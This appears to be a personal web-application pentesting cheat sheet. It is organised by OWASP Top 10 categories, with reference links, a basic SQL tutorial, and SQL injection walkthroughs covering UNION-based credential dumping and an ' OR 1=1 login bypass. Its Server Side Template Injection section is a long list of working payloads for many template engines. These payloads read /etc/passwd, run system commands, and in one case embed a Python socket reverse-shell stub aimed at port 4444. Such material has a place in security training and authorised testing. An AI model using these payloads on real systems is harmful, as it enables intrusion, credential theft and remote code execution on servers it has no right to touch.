# Webb-app

## Table of content

- [tools](#tools)
  - [XSRFProbe](#XSRFProbe)
- [owasp top 10](#owasp-top-10)
- [Broken Access Control](#Broken-Access-Control)
- [Cryptographic Failures ](#Cryptographic-Failures )
- [Injection](#Injection)
  - [basic SQL](#basic-SQL)
  - [What is SQL Injection](#What-is-SQL-Injection)
  - [In Band SQLi](#In-Band-SQLi)
  - [Blind SQLi Authentication Bypass](#Blind-SQLi-Authentication-Bypass)
- [Insecure Design](#Insecure-Design)
- [Security Misconfiguration](#Security-Misconfiguration)
- [Vulnerable and Outdated Components](#Vulnerable-and-Outdated-Components)
- [Identification and Authentication Failures](#Identification-and-Authentication-Failures)
- [Software and Data Integrity Failures](#Software-and-Data-Integrity-Failures)
- [Security Logging and Monitoring Failures](#Security-Logging-and-Monitoring-Failures)
- [Server-Side Request Forgery](#Server-Side-Request-Forgery)
- [Server Side Template Injection](#Server-Side-Template-Injection)
- [File Inclusion ](#File-Inclusion)
- [](#)
- [](#)


### tools

### XSRFProbe

The Prime Cross Site Request Forgery (CSRF) Audit and Exploitation Toolkit. 

XSRFProbe is an advanced Cross Site Request Forgery (CSRF/XSRF) Audit and Exploitation Toolkit. Equipped with a powerful crawling engine and numerous systematic checks, it is able to detect most cases of CSRF vulnerabilities, their related bypasses and futher generate (maliciously) exploitable proof of concepts with each found vulnerability.

```
https://github.com/0xInfection/XSRFProbe
```

### owasp top 10

```
https://owasp.org/
```

### Broken Access Control
Common Weakness Enumerations (CWEs) included are 
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-201: Insertion of Sensitive Information Into Sent Data
CWE-352: Cross-Site Request Forgery.
```
https://owasp.org/Top10/A01_2021-Broken_Access_Control/
```

### Cryptographic Failures 
Notable Common Weakness Enumerations (CWEs) included are 
CWE-259: Use of Hard-coded Password
CWE-327: Broken or Risky Crypto Algorithm
CWE-331 Insufficient Entropy.
```
https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
```

### Injection
Notable Common Weakness Enumerations (CWEs) included are 
CWE-79: Cross-site Scripting
CWE-89: SQL Injection
CWE-73: External Control of File Name or Path
```
https://owasp.org/Top10/A03_2021-Injection/
```
```
https://portswigger.net/web-security/cross-site-scripting
```
```
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
```
```
file:///tmp/mozilla_kali0/cheat-sheet.pdf
```
```
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
```
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
```
https://book.hacktricks.xyz/pentesting-web/sql-injection
```

### basic SQL  

What is a database?

A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this task but first, it's important to learn a few terms.

Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You'd store this information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.

![image](https://user-images.githubusercontent.com/24814781/181730683-ca25cf99-ccf6-421a-b2b0-22923d739ce1.png)

Columns:

Each column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string "hello world" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a key field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries.


Rows:

Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed.



Relational Vs Non-Relational Databases:
A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.


Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.


The simplest of the commands which we'll cover in this task is used to retrieve (select), update, insert and delete data. Although somewhat similar, some databases servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case sensitive.

SELECT

The first query type we'll learn is the SELECT query used to retrieve data from the database.

```
select * from users;
```

![image](https://user-images.githubusercontent.com/24814781/181731922-dda9ff50-aa9c-4976-8d42-81aa94acc4ff.png)

The first-word SELECT tells the database we want to retrieve some data, the * tells the database we want to receive back all columns from the table. For example, the table may contain three columns (id, username and password). "from users" tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.  


The next query is similar to the above, but this time, instead of using the * to return all columns in the database table, we are just requesting the username and password field.

```
select username,password from users;
```

![image](https://user-images.githubusercontent.com/24814781/181732264-93a96d01-4d65-44f1-8cbb-064b10fa9bee.png)


The following query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

```
select * from users LIMIT 1;
```

![image](https://user-images.githubusercontent.com/24814781/181732646-c1d92391-5847-433a-a95a-2db1c153cfde.png)


Lastly, we're going to utilise the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:

```
select * from users where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181732844-fd4072b6-bc52-4c52-a842-706493d4639f.png)


This will only return the rows where the username is equal to admin.

```
select * from users where username != 'admin';
```

![image](https://user-images.githubusercontent.com/24814781/181733026-c5d5623e-665d-4e08-b333-7ad896a35481.png)

This will only return the rows where the username is NOT equal to admin.

```
select * from users where username='admin' or username='jon';
```

![image](https://user-images.githubusercontent.com/24814781/181733283-0393f3a0-f974-4e35-9eb7-b0b036beafc3.png)

This will only return the rows where the username is either equal to admin or jon. 

```
select * from users where username='admin' and password='p4ssword';
```

![image](https://user-images.githubusercontent.com/24814781/181733401-954f7b20-5cc2-4cd5-a8cd-a19bf58101e8.png)

This will only return the rows where the username is equal to admin, and the password is equal to p4ssword.


Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.

```
select * from users where username like 'a%';
```

![image](https://user-images.githubusercontent.com/24814781/181733685-c02a1f84-42bb-465b-a0ab-e509252e6077.png)

This returns any rows with username beginning with the letter a.

```
select * from users where username like '%n';
```

![image](https://user-images.githubusercontent.com/24814781/181733770-86fe4f8f-1b57-4538-9843-32bf355165b4.png)


This returns any rows with username ending with the letter n.

```
select * from users where username like '%mi%';
```

![image](https://user-images.githubusercontent.com/24814781/181733893-49efaaa5-665f-4001-b2a6-f27d1af019a1.png)

UNION

The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. This might sound not very clear, so let's use the following analogy. Say a company wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have one table called customers with the following contents: 

![image](https://user-images.githubusercontent.com/24814781/181734143-c5c3c958-6095-48f5-a4ab-64862731cfb4.png)


And another called suppliers with the following contents:

![image](https://user-images.githubusercontent.com/24814781/181734193-cf3cbdc2-a034-4ad0-923c-ac3a9d3dce40.png)


Using the following SQL Statement, we can gather the results from the two tables and put them into one result set:

```
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
```

![image](https://user-images.githubusercontent.com/24814781/181734366-e5a8e203-ec50-4974-bba9-9f68c0b31b02.png)

INSERT

The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.

```
insert into users (username,password) values ('bob','password123');
```

![image](https://user-images.githubusercontent.com/24814781/181734580-f6a1eb8e-1395-4823-818f-c683ebacc30c.png)

UPDATE

The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

```
update users SET username='root',password='pass123' where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181734707-7e04e537-7f68-4aec-ab8c-9b48c330e4ec.png)


DELETE

The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

```
delete from users where username='martin';
```

![image](https://user-images.githubusercontent.com/24814781/181735171-c1d88d3b-556c-4b18-9a19-519ad383bc3b.png)


delete from users;


Because no WHERE clause was being used in the query, all the data is deleted in the table.

![image](https://user-images.githubusercontent.com/24814781/181735602-89133a1b-1641-4cb2-9214-677e910f5176.png)


### What is SQL Injection

What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

What does it look like?
Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:

```
https://website.thm/blog?id=1
```

From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

```
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.

As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.

Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:

```
https://website.thm/blog?id=2;--
```

Which would then, in turn, produce the SQL statement:

```
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

```
SELECT * from blog where id=2;--
```

This was just one example of an SQL Injection vulnerability of a type called In-Band SQL Injection; there are 3 types in total In-Band, Blind and Out Of Band.


### In Band SQLi 

In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

Practical tips and example:

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).


Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 


The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:


1 UNION SELECT 1


This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:


1 UNION SELECT 1,2


Same error again, so let's repeat by adding another column:


1 UNION SELECT 1,2,3


Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.


0 UNION SELECT 1,2,3


You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:


0 UNION SELECT 1,2,database()


You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.


Our next query will gather a list of tables that are in this database.


0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'


There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.


0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'


This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.


0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

### Blind SQLi Authentication Bypass 

Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.


Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 


Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 


Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

Practical tips and example:

Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:


select * from users where username='%username%' and password='%password%' LIMIT 1;


N.B The %username% and %password% values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.


To make this into a query that always returns as true, we can enter the following into the password field:


' OR 1=1;--


Which turns the SQL query into the following:


select * from users where username='' and password='' OR 1=1;


Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.



### Insecure Design
Notable Common Weakness Enumerations (CWEs) include
CWE-209: Generation of Error Message Containing Sensitive Information
CWE-256: Unprotected Storage of Credentials
CWE-501: Trust Boundary Violation
CWE-522: Insufficiently Protected Credentials
```
https://owasp.org/Top10/A04_2021-Insecure_Design/
```

### Security Misconfiguration
Notable CWEs included are 
CWE-16 Configuration
CWE-611 Improper Restriction of XML External Entity Reference
```
https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
```

### Vulnerable and Outdated Components
Notable CWEs included are 
CWE-1104: Use of Unmaintained Third-Party Components and the two CWEs from Top 10 2013 and 2017
```
https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
```

### Identification and Authentication Failures 
Notable CWEs included are 
CWE-297: Improper Validation of Certificate with Host Mismatch
CWE-287: Improper Authentication
CWE-384: Session Fixation
```
https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures
```

### Security Logging and Monitoring Failures
Notable Common Weakness Enumerations (CWEs) include 
CWE-829: Inclusion of Functionality from Untrusted Control Sphere
CWE-494: Download of Code Without Integrity Check
CWE-502: Deserialization of Untrusted Data
```
https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
```

### Server-Side Request Forgery
```
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
```
```
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
```

### Server Side Template Injection
```
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```
```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```
```
{{4*4}}[[5*5]]
{{7*7}}
{{7*'7'}}
<%= 7 * 7 %>
${3*3}
${{7*7}}
@(1+2)
#{3*3}
#{ 7 * 7 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```

### File Inclusion 
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
```
```
https://highon.coffee/blog/lfi-cheat-sheet/
```
